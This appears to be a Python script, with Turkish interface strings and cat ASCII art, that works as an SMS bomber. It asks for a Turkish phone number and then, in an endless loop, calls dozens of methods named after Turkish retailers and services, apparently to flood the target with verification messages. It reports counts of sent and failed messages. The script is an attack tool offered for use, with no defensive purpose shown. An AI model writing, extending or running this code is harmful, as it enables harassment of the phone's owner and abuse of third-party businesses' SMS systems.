from colorama import Fore, Style, init
init(autoreset=True)
from time import sleep
from os import system
from sms import SendSms
import sms
from concurrent.futures import ThreadPoolExecutor, wait
import threading
import fade
import time

servisler_sms = []
for attribute in dir(SendSms):
    attribute_value = getattr(SendSms, attribute)
    if callable(attribute_value):
        if attribute.startswith('__') == False:
            servisler_sms.append(attribute)





ascii_yazi = r"""
     ▄▄▄        ██████▓██   ██▓ ▄▄▄         |\---/|
    ▒████▄    ▒██    ▒ ▒██  ██▒▒████▄       | o_o |
    ▒██  ▀█▄  ░ ▓██▄    ▒██ ██░▒██  ▀█▄      \_^_/
    ░██▄▄▄▄██   ▒   ██▒ ░ ▐██▓░░██▄▄▄▄██ 
     ▓█   ▓██▒▒██████▒▒ ░ ██▒▓░ ▓█   ▓██▒
     ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░  ██▒▒▒  ▒▒   ▓▒█░
      ▒   ▒▒ ░░ ░▒  ░ ░▓██ ░▒░   ▒   ▒▒ ░
      ░   ▒   ░  ░  ░  ▒ ▒ ░░    ░   ▒   
          ░  ░      ░  ░ ░           ░  ░
                       ░ ░               
"""


kedi = r"""
          |\      _,,,---,,_
    ZZZzz /,`.-'`'    -.  ;-;;,_
         |,4-  ) )-,_. ,\ (  `'-'
        '---''(_/--'  `-'\_)  Kedi uyandırılıyor...
"""

kedi1 = r"""
     _._     _,-'""`-._
    (,-.`._,'(       |\`-/|     Kedi UYANDI!
        `-.-' \ )-`( , o o)
              `-    \`_`"'-
"""


def titresim():
    titresim_is = threading.Thread(target=system, args=["termux-vibrate -d 3500 -f"])
    titresim_is.start()


def asya():
        print(f"""
      \    /\       Meow.
       )  ( ')      Toplam                : {Style.BRIGHT}{sms.toplam}{Style.RESET_ALL}
      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{sms.basarili}{Style.RESET_ALL}
asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{sms.basarisiz}{Style.RESET_ALL}
""")

system("cls||clear")
print(fade.blackwhite(kedi))
titresim
time.sleep(5)
system("cls||clear")
print(fade.blackwhite(kedi1))
time.sleep(3)

while 1:
    system("cls||clear")
    print(fade.pinkred(ascii_yazi))
    try:
        print("""

    0|  CIKIS
    
    1|  Basla!
    2|  YARDIMMM

""")
        menu = input(" $ " + Fore.MAGENTA)
        if menu == "":
            continue
        menu = int(menu) 
    except ValueError:
        system("cls||clear")
        print(Fore.LIGHTRED_EX + "Hatalı giriş yaptın. Tekrar deneyiniz.")
        sleep(3)
        continue
    if menu == 0:
        system("cls||clear")
        print("Gorusurruuzz")
        exit()
    elif menu == 2:
        system("cls||clear")
        print("wp den yazzz")
        print("Bu ekran 4.1 saniye icinde kayıplara krisacakk.")
        time.sleep(4.1)
        
    elif menu == 1:
        system("cls||clear")
        tel_no = input("Telefon numarasını basındaki 90 olmadan yaz : " + Fore.MAGENTA)
        try:
            int(tel_no)
            if len(tel_no) != 10:
                raise ValueError
        except ValueError:
            system("cls||clear")
            print("Malll yanlıs girdin") 
            sleep(3)
            continue
        system("cls||clear")
        mail = ""
        send_sms = SendSms(tel_no, mail)
        try:
            while True:
                with ThreadPoolExecutor() as executor:
                    futures = [
                        executor.submit(send_sms.Akasya),
                        executor.submit(asya),
                        executor.submit(asya),
                        executor.submit(asya),
                        executor.submit(send_sms.Akbati),
                        executor.submit(asya),
                        executor.submit(asya),
                        executor.submit(asya),
                        executor.submit(send_sms.Ayyildiz),
                        executor.submit(asya),
                        executor.submit(asya),
                        executor.submit(asya),
                        executor.submit(send_sms.Baydoner),
                        executor.submit(asya),
                        executor.submit(asya),
                        executor.submit(asya),
                        executor.submit(send_sms.Beefull),
                        executor.submit(asya),
                        executor.submit(asya),
                        executor.submit(asya),
                        executor.submit(send_sms.Bim),
                        executor.submit(asya),
                        executor.submit(asya),
                        executor.submit(asya),
                        executor.submit(send_sms.Bisu),
                        executor.submit(asya),
                        executor.submit(asya),
                        executor.submit(asya),
                        executor.submit(send_sms.Bodrum),
                        executor.submit(asya),
                        executor.submit(asya),
                        executor.submit(asya),
                        executor.submit(send_sms.Clickme),
                        executor.submit(asya),
                        executor.submit(asya),
                        executor.submit(asya),
                        executor.submit(send_sms.Dominos),
                        executor.submit(asya),
                        executor.submit(asya),
                        executor.submit(asya),
                        executor.submit(send_sms.Englishhome),
                        executor.submit(asya),
                        executor.submit(asya),
                        executor.submit(asya),
                        executor.submit(send_sms.Evidea),
                        executor.submit(asya),
                        executor.submit(asya),
                        executor.submit(asya),
                        executor.submit(send_sms.File),
                        executor.submit(asya),
                        executor.submit(send_sms.Frink),
                        executor.submit(asya),
                        executor.submit(send_sms.Happy),
                        executor.submit(asya),
                        executor.submit(send_sms.Hayatsu),
                        executor.submit(asya),
                        executor.submit(send_sms.Hey),
                        executor.submit(asya),
                        executor.submit(send_sms.Hizliecza),
                        executor.submit(asya),
                        executor.submit(send_sms.Icq),
                        executor.submit(asya),
                        executor.submit(send_sms.Ipragaz),
                        executor.submit(asya),
                        executor.submit(send_sms.Istegelsin),
                        executor.submit(asya),
                        executor.submit(send_sms.Joker),
                        executor.submit(asya),
                        executor.submit(send_sms.KahveDunyasi),
                        executor.submit(asya),
                        executor.submit(send_sms.KimGb),
                        executor.submit(asya),
                        executor.submit(send_sms.Komagene),
                        executor.submit(asya),
                        executor.submit(send_sms.Koton),
                        executor.submit(asya),
                        executor.submit(send_sms.KuryemGelsin),
                        executor.submit(asya),
                        executor.submit(send_sms.Macro),
                        executor.submit(asya),
                        executor.submit(send_sms.Metro),
                        executor.submit(asya),
                        executor.submit(send_sms.Migros),
                        executor.submit(asya),
                        executor.submit(send_sms.Naosstars),
                        executor.submit(asya),
                        executor.submit(send_sms.Paybol),
                        executor.submit(asya),
                        executor.submit(send_sms.Pidem),
                        executor.submit(asya),
                        executor.submit(send_sms.Porty),
                        executor.submit(asya),
                        executor.submit(send_sms.Qumpara),
                        executor.submit(asya),
                        executor.submit(send_sms.Starbucks),
                        executor.submit(asya),
                        executor.submit(send_sms.Suiste),
                        executor.submit(asya),
                        executor.submit(send_sms.Taksim),
                        executor.submit(asya),
                        executor.submit(send_sms.Tasdelen),
                        executor.submit(asya),
                        executor.submit(send_sms.Tasimacim),
                        executor.submit(asya),
                        executor.submit(send_sms.Tazi),
                        executor.submit(asya),
                        executor.submit(send_sms.TiklaGelsin),
                        executor.submit(asya),
                        executor.submit(send_sms.ToptanTeslim),
                        executor.submit(asya),
                        executor.submit(send_sms.Uysal),
                        executor.submit(asya),
                        executor.submit(send_sms.Wmf),
                        executor.submit(asya),
                        executor.submit(send_sms.Yapp),
                        executor.submit(asya),
                        executor.submit(send_sms.YilmazTicaret),
                        executor.submit(asya),
                        executor.submit(send_sms.Yuffi),
                        executor.submit(asya)
                    ]

                    
                    wait(futures)
        except KeyboardInterrupt:
            system("cls||clear")
            print("\nCtrl+C BASTI ölüyoum....")
            exit()
